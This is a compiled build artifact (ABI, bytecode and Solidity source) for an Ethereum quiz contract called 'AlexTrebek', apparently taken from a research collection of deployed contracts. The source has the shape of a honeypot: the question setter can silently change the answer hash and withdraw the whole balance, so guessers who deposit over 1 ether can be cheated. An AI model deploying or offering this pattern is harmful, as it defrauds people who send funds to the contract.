{
  "contractName": "AlexTrebek",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "Jeopardy",
      "outputs": [
        {
          "name": "",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "response",
          "type": "string"
        }
      ],
      "name": "Answer",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "question",
          "type": "string"
        },
        {
          "name": "response",
          "type": "string"
        }
      ],
      "name": "QuestionIs",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "EndQuestion",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "question",
          "type": "string"
        },
        {
          "name": "_responseHash",
          "type": "bytes32"
        }
      ],
      "name": "NewQuestion",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506106d9806100206000396000f30060806040526004361061006d576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063292ca2fe1461006f5780633e3ee859146100ff5780638281feaa14610169578063b18de6181461020b578063e94e83d814610215575b005b34801561007b57600080fd5b50610084610271565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100c45780820151818401526020810190506100a9565b50505050905090810190601f1680156100f15780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b610167600480360381019080803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290803560001916906020019092919050505061030f565b005b610209600480360381019080803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290803590602001908201803590602001908080601f016020809104026020016040519081016040528093929190818152602001838380828437820191505050505050919291929050505061038c565b005b610213610468565b005b61026f600480360381019080803590602001908201803590602001908080601f016020809104026020016040519081016040528093929190818152602001838380828437820191505050505050919291929050505061051f565b005b60018054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156103075780601f106102dc57610100808354040283529160200191610307565b820191906000526020600020905b8154815290600101906020018083116102ea57829003601f168201915b505050505081565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141561038857816001908051906020019061037b929190610608565b5080600081600019169055505b5050565b600060010260005460001916141561046457806040518082805190602001908083835b6020831015156103d457805182526020820191506020810190506020830392506103af565b6001836020036101000a0380198251168184511680821785525050505050509050019150506040518091039020600081600019169055508160019080519060200190610421929190610608565b5033600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b5050565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141561051d573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f1935050505015801561051b573d6000803e3d6000fd5b505b565b806040518082805190602001908083835b6020831015156105555780518252602082019150602081019050602083039250610530565b6001836020036101000a038019825116818451168082178552505050505050905001915050604051809103902060001916600054600019161480156105a15750670de0b6b3a764000034115b15610605573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050158015610603573d6000803e3d6000fd5b505b50565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f1061064957805160ff1916838001178555610677565b82800160010185558215610677579182015b8281111561067657825182559160200191906001019061065b565b5b5090506106849190610688565b5090565b6106aa91905b808211156106a657600081600090555060010161068e565b5090565b905600a165627a7a723058209ae3fb0550b1f0b75f342c1e25733b1e30de81fb945d68b3c9c3d335ea876b8b0029",
  "source": "\n\ncontract AlexTrebek\n{\n    bytes32 responseHash;\n    string public Jeopardy;\n    address questionSender;\n\n    function Answer(string response)\n    public payable {\n        if (responseHash == keccak256(response) && msg.value > 1 ether) {\n            msg.sender.transfer(address(this).balance);\n        }\n    }\n \n    function QuestionIs(string question, string response)\n    public payable {\n        if (responseHash == 0x0) {\n            responseHash = keccak256(response);\n            Jeopardy = question;\n            questionSender = msg.sender;\n        }\n    }\n\n    function EndQuestion()\n    public payable {\n        if (msg.sender == questionSender) {\n            msg.sender.transfer(address(this).balance);\n        }\n    }\n\n    function NewQuestion(string question, bytes32 _responseHash)\n    public payable {\n        if (msg.sender == questionSender) {\n            Jeopardy = question;\n            responseHash = _responseHash;\n        }\n    }\n    \n    function () payable public {}\n}",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0x06c2452bcb4c1c1a046c520ffbad41fb8f48442b/contracts/0x06c2452bcb4c1c1a046c520ffbad41fb8f48442b.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T03:45:12.680Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}